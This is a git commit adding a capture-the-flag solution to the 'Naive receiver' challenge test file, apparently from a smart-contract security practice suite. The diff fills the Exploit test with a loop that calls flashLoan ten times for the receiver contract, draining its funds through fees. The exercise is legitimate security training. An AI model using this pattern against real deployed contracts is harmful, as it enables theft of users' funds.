7620fad03f36616ce28ba6687a8fdb696815aa90
Sheldon Holmgren <sheldonholmgren@proton.me>
2022-10-24 09:56:54 +0300

    naive-receiver: very naive solution (10 txs)

--- test/naive-receiver/naive-receiver.challenge.js
+++ test/naive-receiver/naive-receiver.challenge.js
@@ -30,7 +30,9 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        for (i = 0; i < 10; ++i) {
+        await this.pool.connect(attacker).flashLoan(this.receiver.address, 1);
+        }
     });
 
     after(async function () {
